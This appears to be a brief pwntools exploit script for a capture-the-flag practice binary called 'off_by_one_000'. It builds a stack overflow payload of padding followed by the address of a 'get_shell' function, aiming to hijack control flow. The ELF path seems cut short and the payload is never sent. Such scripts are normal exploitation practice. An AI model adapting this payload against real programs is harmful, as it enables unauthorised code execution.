from pwn import *

rem = process("./Pwnable/off_by_one_000/problem/off_by_one_000")

elf = ELF("./Pwnable/off")

getShell_addr = elf.symbols['get_shell']

payload = b'A' * 0x108 + p64(getShell_addr)
